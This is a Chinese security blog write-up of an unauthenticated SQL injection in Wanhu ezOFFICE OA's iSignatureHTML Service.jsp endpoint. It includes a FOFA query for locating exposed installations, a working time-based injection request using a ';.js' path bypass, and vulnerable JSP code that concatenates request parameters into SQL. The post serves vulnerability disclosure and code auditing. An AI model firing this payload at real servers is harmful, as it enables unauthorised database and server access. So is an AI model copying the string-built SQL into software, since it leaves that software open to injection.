---
title: "万户OA public/iSignatureHTML.jsp/Service.jsp SQL注入漏洞"
source: https://mrxn.net/jswz/defaultroot-ezOFFICE-Service-sqli.html
asset_dir: assets/万户oa-publicisignaturehtml.jspservice.jsp-sql注入漏洞
---

# 万户OA public/iSignatureHTML.jsp/Service.jsp SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/1/13 19:10
- 1290浏览
- [0评论](#comment)
- 59分钟阅读

深入探索

身份验证

SQL

鉴权

---

# 0x01 产品简介

万户OA [ezoffice](https://mrxn.net/tag/ezoffice "ezoffice") 是万户网络协同办公产品多年来一直将主要精力致力于中高端市场的一款OA协同办公软件产品，统一的基础管理平台，实现用户数据统一管理、权限统一分配、身份统一认证。统一规划门户网站群和协同办公平台，将外网信息维护、客户服务、互动交流和日常工作紧密结合起来，有效提高工作效率。

# 0x02 漏洞概述

万户 ezOFFICE public/iSignatureHTML.jsp/Service.jsp 接口存在[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞，未授权的攻击者可利用此[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")获取数据库权限，深入利用可获取服务器权限。

# 0x03 复现环境

本地环境 OR FOFA：app="ezOFFICE协同管理平台" || app="万户ezOFFICE协同管理平台" || app="万户网络-ezOFFICE"

深入探索

编程语言教程

Docker加速服务

漏洞扫描服务

# 漏洞复现

```
GET /defaultroot/public/iSignatureHTML.jsp/Service.jsp;.js?COMMAND=SAVESIGNATURE&DOCUMENTID=1&EXTPARAM=1&SIGNATURE=1&SIGNATUREID='waitfor+delay'0:0:4'--&USERNAME=admin+HTTP/1.1
Host: ezoffice.mrxn.net
```

成功延时 4 秒

[[![万户OA public/iSignatureHTML.jsp/Service.jsp SQL注入漏洞](images/img-001-4e7a28070ad0.png)](https://mrxn.net/content/uploadfile/202501/60991736766847.png)](https://mrxn.net/content/uploadfile/202501/60991736766847.png)

# 漏洞分析

> 关于鉴权绕过，参考这篇文章：[万户 ezOFFICE ajax\_checkUserNum.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-ajax_checkUserNum-sqli.html)

public/iSignatureHTML.jsp/Service.jsp 主要业务逻辑代码如下，非常简单！

## SAVESIGNATURE

```
<%
    mCommand=request.getParameter("COMMAND");
    mUserName=new String(request.getParameter("USERNAME").getBytes("8859_1"));
    mExtParam=new String(request.getParameter("EXTPARAM").getBytes("8859_1"));
......
if(mCommand.equalsIgnoreCase("SAVESIGNATURE")){        //保存签章数据信息
mDocumentID=new String(request.getParameter("DOCUMENTID").getBytes("8859_1"));
mSignatureID=new String(request.getParameter("SIGNATUREID").getBytes("8859_1"));
mSignature=new String(request.getParameter("SIGNATURE").getBytes("8859_1"));
//System.out.println("Signature:"+mSignature);
if (ObjConnBean.OpenConnection()){
      strSql="SELECT * from HTMLSignature Where SignatureID='"+mSignatureID+"' and DocumentID='"+mDocumentID+"'";
    ResultSet rs = null;
    rs = ObjConnBean.ExecuteQuery(strSql);
    if (rs.next()) {
       strSql = "update HTMLSignature set DocumentID='"+mDocumentID+"',SIGNATUREID='"+mSignatureID+"',Signature='"+mSignature+"'";
       strSql = strSql + "  Where SignatureID='"+mSignatureID+"' and DocumentID='"+mDocumentID+"'";
       ObjConnBean.ExecuteUpdate(strSql);
    }else{
       java.sql.PreparedStatement prestmt=null;
       try{
            //取得唯一值(mSignature)
          java.util.Date dt=new java.util.Date();
          long lg=dt.getTime();
          Long ld=new Long(lg);
          mSignatureID=ld.toString();
          String Sql="insert into HTMLSignature (DocumentID,SignatureID,Signature) values (?,?,?) ";             
          prestmt=ObjConnBean.Conn.prepareStatement(Sql);
          prestmt.setString(1, mDocumentID);
          prestmt.setString(2, mSignatureID);
          prestmt.setString(3, mSignature);

          ObjConnBean.Conn.setAutoCommit(true);
          prestmt.execute();
          //ObjConnBean.Conn.commit();
          prestmt.close();
          mResult=true;
       }
       catch(SQLException e){
          System.out.println("保存签章错误:"+e.toString());
          mResult=false;
       }
    }
ObjConnBean.CloseConnection();
}
out.clear();
out.print("SIGNATUREID="+mSignatureID+"\r\n");
out.print("RESULT=OK");
```

如果 `COMMAND` 等于 `SAVESIGNATURE`，则直接将 `DOCUMENTID`、`SIGNATUREID` 拼接进SQL语句，造成[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞，就是这么朴实无华！

同时其他几处也存在类似的问题

## DELESIGNATURE

```
if(mCommand.equalsIgnoreCase("DELESIGNATURE")){   //删除签章数据信息
    mDocumentID=request.getParameter("DOCUMENTID");
    mSignatureID=request.getParameter("SIGNATUREID");
       if (ObjConnBean.OpenConnection()){
          strSql="SELECT * from HTMLSignature Where SignatureID='"+mSignatureID+"' and DocumentID='"+mDocumentID+"'";
       ResultSet rs=null;
       rs = ObjConnBean.ExecuteQuery(strSql);
       if(rs.next()){
          try{
             strSql="DELETE from HTMLSignature Where SignatureID='"+mSignatureID+"' and DocumentID='"+mDocumentID+"'";
             ObjConnBean.ExecuteUpdate(strSql);
          }
          catch(Exception ex){
             out.println(ex.toString());
          }
       }
       ObjConnBean.CloseConnection();
       }
    out.clear();
    out.print("RESULT=OK");
}
```

## LOADSIGNATURE

```
if(mCommand.equalsIgnoreCase("LOADSIGNATURE")){    //调入签章数据信息
    mDocumentID=request.getParameter("DOCUMENTID");
    mSignatureID=request.getParameter("SIGNATUREID"); 

    mDocumentID=com.whir.component.security.crypto.EncryptUtil.sqlcode(mDocumentID);
    mSignatureID=com.whir.component.security.crypto.EncryptUtil.sqlcode(mSignatureID);

    if (ObjConnBean.OpenConnection()){
       strSql="SELECT * from HTMLSignature Where SignatureID='"+mSignatureID+"' and DocumentID='"+mDocumentID+"'";
       ResultSet rs=null;
       rs = ObjConnBean.ExecuteQuery(strSql);
       if(rs.next()){
          mSignature=rs.getString("Signature");
       }
       ObjConnBean.CloseConnection();
    }
    out.clear();
    out.print(mSignature+"\r\n"); 
    out.print("RESULT=OK");
}
```

## SHOWSIGNATURE

```
if(mCommand.equalsIgnoreCase("SHOWSIGNATURE")){   //获取当前签章SignatureID，调出SignatureID，再自动调LOADSIGNATURE数据
    mSignatures="";
    mDocumentID=request.getParameter("DOCUMENTID");  
    mDocumentID=com.whir.component.security.crypto.EncryptUtil.sqlcode(mDocumentID);
       if (ObjConnBean.OpenConnection()){
          strSql="SELECT * from HTMLSignature Where DocumentID='"+mDocumentID + "'";
       ResultSet rs=null;
       rs = ObjConnBean.ExecuteQuery(strSql);
       while(rs.next()){
          mSignatures=mSignatures+rs.getString("SignatureID")+";";
       }
       ObjConnBean.CloseConnection();
       }
    out.clear(); 
    out.print("SIGNATURES="+mSignatures+"\r\n");
    out.print("RESULT=OK");
}
```

## GETSIGNATUREDATA

```
if(mCommand.equalsIgnoreCase("GETSIGNATUREDATA")){           //批量签章时，获取所要保护的数据

   String mSignatureData="";
    mDocumentID=request.getParameter("DOCUMENTID");
       System.out.println(new String(request.getParameter("FIELDSLIST").getBytes("8859_1")) );
       System.out.println(request.getParameter("FIELDSNAME"));
       if (ObjConnBean.OpenConnection()){
          strSql="SELECT XYBH,BMJH,JF,YF,HZNR,QLZR,CPMC,DGSL,DGRQ  from HTMLDocument Where DocumentID='"+mDocumentID + "'";
       ResultSet rs=null;
       rs = ObjConnBean.ExecuteQuery(strSql);
```

# 最后

其他万户OA 相关漏洞  
[万户 ezOFFICE selectAmountField.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-selectAmountField-sqli.html)  
[万户OA系列漏洞](https://mrxn.net/tag/ezoffice)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#ezOFFICE](https://mrxn.net/tag/ezOFFICE)

---

文章目录

- [1.0x01 产品简介](#toc-1-)
- [2.0x02 漏洞概述](#toc-2-)
- [3.0x03 复现环境](#toc-3-)
- [4.漏洞复现](#toc-4-)
- [5.漏洞分析](#toc-5-)
- [5.1.SAVESIGNATURE](#toc-5-1-)
- [5.2.DELESIGNATURE](#toc-5-2-)
- [5.3.LOADSIGNATURE](#toc-5-3-)
- [5.4.SHOWSIGNATURE](#toc-5-4-)
- [5.5.GETSIGNATUREDATA](#toc-5-5-)
- [6.最后](#toc-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
